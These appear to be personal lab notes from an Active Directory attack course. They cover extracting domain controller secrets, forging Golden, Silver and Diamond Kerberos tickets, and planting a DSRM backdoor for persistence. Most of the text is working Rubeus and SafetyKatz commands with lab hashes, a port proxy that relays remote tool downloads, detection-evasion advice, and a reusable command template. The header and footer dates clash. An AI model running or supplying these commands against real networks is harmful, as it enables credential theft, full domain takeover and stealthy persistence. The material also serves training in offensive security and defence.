# Attack - Golden Ticket, Silver Ticket, Diamond Ticket & DSRM Persistence

**Date:** September 12, 2026
**Topic:** Extracting DC Secrets & Forging Kerberos Tickets for Full Domain Compromise

---

## Overview

```
Four attacks covered:
1. Golden Ticket — Use KRBTGT hash to forge any TGT
2. Silver Ticket — Use machine hash to forge service tickets
3. Diamond Ticket — Stealthy Golden Ticket via TGT delegation
4. DSRM Persistence — DC backdoor via local SAM admin
```

---

## Phase 1: Extract Secrets from DC

### Start DA Process

```powershell
# Run from elevated cmd (Run as Administrator)
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt `
  /user:svcadmin `
  /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 `
  /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

# New cmd.exe opens with Domain Admin privileges
```

---

### Copy Tools & Setup DC

```powershell
# Copy Loader to DC
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y

# Connect to DC
winrs -r:dcorp-dc cmd

# Setup port proxy (hide outbound traffic)
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x
```

---

### Extract Credentials (Two Methods)

**Method 1: LSA Dump (NTLM hashes)**

```powershell
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe `
  -args "lsadump::evasive-lsa /patch" "exit"

# Gets: NTLM hashes of all domain users
```

---

**Method 2: DCSync (KRBTGT key)**

```powershell
# From student VM (using DA privileges)
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe `
  -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"

# Gets:
# KRBTGT NTLM: 4e9815869d2090ccfca61c1fe0d23986
# KRBTGT AES256: 154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848
```

---

## Attack 1: Golden Ticket

### What is Golden Ticket?

```
KRBTGT = KDC key (signs all TGTs in domain)
Golden Ticket = TGT forged using KRBTGT hash
Result = Access to ANY service as ANY user
Works even if password reset (until KRBTGT resets)
```

---

### Step 1: Generate Command (Preview)

```powershell
# Generate OPSEC-friendly command (doesn't inject yet)
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe `
  -args evasive-golden `
  /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 `
  /sid:S-1-5-21-719815819-3726368948-3917688648 `
  /ldap `
  /user:Administrator `
  /printcmd

# /printcmd = Shows full command to use
# Copy the output and add /ptt at end
```

---

### Step 2: Create & Inject Ticket

```powershell
# Full command (with /ptt to inject)
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden `
  /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 `
  /user:Administrator `
  /id:500 `
  /pgid:513 `
  /domain:dollarcorp.moneycorp.local `
  /sid:S-1-5-21-719815819-3726368948-3917688648 `
  /pwdlastset:"11/11/2022 6:34:22 AM" `
  /minpassage:1 `
  /logoncount:152 `
  /netbios:dcorp `
  /groups:544,512,520,513 `
  /dc:DCORP-DC.dollarcorp.moneycorp.local `
  /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD `
  /ptt
```

**Parameters:**
- `/aes256:` — KRBTGT AES256 key (for ticket signing)
- `/user:Administrator` — User to impersonate
- `/id:500` — Administrator RID
- `/groups:512` — Domain Admins
- `/ptt` — Inject into session

---

### Step 3: Use Golden Ticket

```powershell
# Access DC as Administrator
winrs -r:dcorp-dc cmd
set username    # Output: Administrator
set computername # Output: DCORP-DC

# You now have full domain admin access!
```

---

## Attack 2: Silver Ticket

### What is Silver Ticket?

```
Machine account hash = Service key
Silver Ticket = Service ticket forged using machine hash
Result = Access to SPECIFIC service only
Advantage = No KRBTGT needed
```

---

**Key differences from Golden Ticket:**

| | Golden | Silver |
|---|---|---|
| Hash used | KRBTGT | Machine account |
| Access | All services | One service |
| Scope | Entire domain | Single service |
| Stealth | Medium | Higher |

---

### Silver Ticket for HTTP (WinRM)

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver `
  /service:http/dcorp-dc.dollarcorp.moneycorp.local `
  /rc4:c6a60b67476b36ad7838d7875c33c2c3 `
  /sid:S-1-5-21-719815819-3726368948-3917688648 `
  /ldap /user:Administrator `
  /domain:dollarcorp.moneycorp.local /ptt

# Verify ticket exists
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args klist

# Use ticket for remote shell
winrs -r:dcorp-dc.dollarcorp.moneycorp.local cmd
set username    # Output: Administrator
set computername # Output: DCORP-DC
```

---

### Silver Ticket for WMI (Needs TWO Tickets)

```powershell
# Ticket 1: HOST service
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver `
  /service:host/dcorp-dc.dollarcorp.moneycorp.local `
  /rc4:c6a60b67476b36ad7838d7875c33c2c3 `
  /sid:S-1-5-21-719815819-3726368948-3917688648 `
  /ldap /user:Administrator `
  /domain:dollarcorp.moneycorp.local /ptt

# Ticket 2: RPCSS service
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver `
  /service:rpcss/dcorp-dc.dollarcorp.moneycorp.local `
  /rc4:c6a60b67476b36ad7838d7875c33c2c3 `
  /sid:S-1-5-21-719815819-3726368948-3917688648 `
  /ldap /user:Administrator `
  /domain:dollarcorp.moneycorp.local /ptt

# Verify both tickets
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args klist

# Use tickets for WMI (start Invisi-Shell first)
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
Get-WmiObject -Class win32_operatingsystem -ComputerName dcorp-dc
```

---

## Attack 3: Diamond Ticket

### What is Diamond Ticket?

```
Golden Ticket problem = Detected (no AS-REQ seen)
Diamond Ticket = Uses real TGT delegation (looks legitimate)
Detection = Much lower than Golden Ticket
Method = Request real TGT, modify it, resign with KRBTGT
```

---

### Execute Diamond Ticket

```powershell
# Run from elevated shell (Run as Administrator)
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args diamond `
  /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 `
  /tgtdeleg `
  /enctype:aes `
  /ticketuser:administrator `
  /domain:dollarcorp.moneycorp.local `
  /dc:dcorp-dc.dollarcorp.moneycorp.local `
  /ticketuserid:500 `
  /groups:512 `
  /createnetonly:C:\Windows\System32\cmd.exe `
  /show /ptt

# New cmd.exe with Administrator token
winrs -r:dcorp-dc cmd
set username    # Output: Administrator
```

**Why Diamond over Golden?**
- `/tgtdeleg` = Uses real TGT delegation (looks normal)
- AES encryption = Modern, less suspicious
- Security monitoring sees: Expected delegation behavior

---

## Attack 4: DSRM Persistence (DC Backdoor)

### What is DSRM?

```
DSRM = Directory Services Restore Mode
├─ Emergency DC recovery account
├─ Stored in local SAM (not Active Directory)
├─ Independent from domain admin passwords
├─ Default: Network logon blocked
└─ Perfect backdoor if enabled for network logon
```

---

### Step 1: Create DA Process

```powershell
# Start DA process
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt `
  /user:svcadmin `
  /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 `
  /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

---

### Step 2: Extract DSRM Hash from SAM

```powershell
# Copy tools to DC
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y

# Connect to DC
winrs -r:dcorp-dc cmd

# Port forwarding
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x

# Dump SAM hive (DSRM admin lives here)
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe `
  -args "token::elevate" "lsadump::evasive-sam" "exit"

# Got: Administrator (local) NTLM: a102ad5753f4c441e3af31c97fad86fd
# This is DSRM admin! Separate from domain admin.
```

---

### Step 3: Enable Network Logon for DSRM

```powershell
# On DC - modify registry to allow DSRM network access
reg add "HKLM\System\CurrentControlSet\Control\Lsa" `
  /v "DsrmAdminLogonBehavior" /t REG_DWORD /d 2 /f

# Value 2 = Allow network logon
# Default = 0 (blocked)
```

---

### Step 4: Use DSRM Admin Hash

```powershell
# From elevated shell on student VM
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe `
  "sekurlsa::evasive-pth /domain:dcorp-dc /user:Administrator `
  /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:cmd.exe" "exit"

# New cmd.exe opens as DCORP-DC\Administrator (DSRM admin)
```

---

### Step 5: Access DC via PSRemoting

```powershell
# Add DC IP to TrustedHosts (from elevated PS)
Set-Item WSMan:\localhost\Client\TrustedHosts 172.16.2.1

# Start Invisi-Shell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

# Connect via NTLM (must use IP, not hostname)
Enter-PSSession -ComputerName 172.16.2.1 `
  -Authentication NegotiateWithImplicitCredential

# Verify
$env:username    # Output: Administrator
# DC access confirmed via DSRM admin!
```

---

## Complete Comparison

| Attack | Hash Needed | Scope | Stealth | Persistence |
|---|---|---|---|---|
| **Golden Ticket** | KRBTGT AES256 | All services | Medium | No |
| **Silver Ticket (HTTP)** | Machine RC4 | HTTP/WinRM only | Higher | No |
| **Silver Ticket (WMI)** | Machine RC4 | WMI only (2 tickets) | Higher | No |
| **Diamond Ticket** | KRBTGT AES256 | All services | Best | No |
| **DSRM** | DSRM NTLM | DC local admin | High | Yes ✓ |

---

## Key Hashes Reference (Lab)

```
KRBTGT AES256: 154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848
KRBTGT NTLM: 4e9815869d2090ccfca61c1fe0d23986
Domain SID: S-1-5-21-719815819-3726368948-3917688648
dcorp-dc$ RC4 (machine): c6a60b67476b36ad7838d7875c33c2c3
svcadmin AES256: 6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011
DSRM Admin NTLM: a102ad5753f4c441e3af31c97fad86fd
DC FQDN: DCORP-DC.dollarcorp.moneycorp.local
DC IP: 172.16.2.1
```

---

## OPSEC Comparison

| Technique | How to Spot | How to Avoid |
|---|---|---|
| Golden Ticket | No AS-REQ before TGT | Use Diamond instead |
| Silver Ticket | Unusual service tickets | Use FQDN, not IP |
| Diamond Ticket | Hard to detect | /tgtdeleg + AES |
| DSRM | Registry change, NTLM to IP | Registry stays, NTLM expected |

---

## Quick Reference Commands

```powershell
# === EXTRACT SECRETS ===
# LSA dump
SafetyKatz "lsadump::evasive-lsa /patch"

# DCSync
SafetyKatz "lsadump::evasive-dcsync /user:dcorp\krbtgt"

# SAM dump
SafetyKatz "token::elevate" "lsadump::evasive-sam"

# === GOLDEN TICKET ===
Rubeus evasive-golden /aes256:KRBTGT_KEY /sid:DOMAIN_SID /ldap /user:Administrator /ptt

# === SILVER TICKET ===
# HTTP
Rubeus evasive-silver /service:http/dcorp-dc.domain /rc4:MACHINE_HASH /ptt
# WMI = HOST + RPCSS
Rubeus evasive-silver /service:host/dcorp-dc.domain /rc4:MACHINE_HASH /ptt
Rubeus evasive-silver /service:rpcss/dcorp-dc.domain /rc4:MACHINE_HASH /ptt

# === DIAMOND TICKET ===
Rubeus diamond /krbkey:KRBTGT_KEY /tgtdeleg /enctype:aes /ticketuser:administrator /ptt

# === DSRM ===
reg add HKLM\System\CurrentControlSet\Control\Lsa /v DsrmAdminLogonBehavior /d 2
SafetyKatz "sekurlsa::evasive-pth /domain:dcorp-dc /user:Administrator /ntlm:DSRM_HASH"
Enter-PSSession -ComputerName DC_IP -Authentication NegotiateWithImplicitCredential
```

---

## Key Takeaway

```
FULL DOMAIN COMPROMISE CHAIN:

1. Use svcadmin (DA) to access DC
2. Extract KRBTGT (DCSync or LSA dump)
3. Create Golden/Diamond Ticket → Any service access
4. Or Silver Ticket → Specific service access
5. Extract DSRM admin hash from SAM
6. Enable DSRM network logon (registry)
7. Persistent DC access via DSRM

Why Golden fails vs Diamond wins:
- Golden: Ticket appears without authentication
- Diamond: Uses real delegation (expected behavior)

Why DSRM is best persistence:
- Independent from AD credentials
- Survives domain password resets
- Often forgotten in incident response
```

---

## References

- [Rubeus - Ticket Attacks](https://github.com/GhostPack/Rubeus)
- [SafetyKatz - LSA / DCSync](https://github.com/GhostPack/SafetyKatz)
- [DSRM Abuse](https://adsecurity.org/?p=2011)
- [Golden vs Diamond Ticket](https://www.semperis.com/blog/a-diamond-ticket-in-the-ruff/)

---

*End of Session Notes - Friday, August 21, 2026*
